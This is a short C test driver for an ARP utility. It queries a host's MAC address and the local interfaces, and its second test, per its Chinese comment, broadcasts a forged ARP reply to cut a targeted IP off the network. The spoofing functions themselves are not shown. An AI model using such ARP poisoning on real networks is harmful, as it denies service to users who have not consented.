/*
 * main.c
 *
 *  Created on: 2015年7月17日
 *      Author: April
 */
#include <stdio.h>
#include <stdlib.h>
#include "arp.h"
#include "hostintf.h"
#include "base.h"

int main(void) {
	//const unsigned char mac[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};//d4:ee:07:05:d6:84
	const unsigned char mac[6] = {0xd4, 0xee, 0x07, 0x05, 0xd6, 0x84};
	const unsigned char ip[4] = {192, 168, 199, 143};

	//1. 测试查询指定ip主机的mac地址
	printf("xxxxxxxxxxxtest query dest mac addrxxxxxxxxxxxxxxxxx");
	const unsigned char destIp[4] = {192,168,7,108};
	const char* interfaceName = "eth0";
	char *destMac = NULL;
	destMac = query_destMacAddr(interfaceName, destIp);
	int i = 0;
	for (i = 0; i < 6; ++i)
	{
		printf("%02x ", (unsigned char)destMac[i]);
	}

	//2. 测试修改指定arp表，让指定ip的用户不能上网,其中ip为需要攻击的对象的ip，mac可以任意写
	printf("xxxxxxxxxxxxxtest broad cast reply packagexxxxxxxxxxxxxxx");
	send_broadCastReplyPackage(IFF_BROADCAST, ip, mac);

	//3. 测试查询主机信息
	MachineIntf *pMachineinfo = (MachineIntf*) malloc(sizeof(MachineIntf) * MAXINTERFACES);
	query_machineInfo(pMachineinfo, MAXINTERFACES);

	return EXIT_SUCCESS;
}
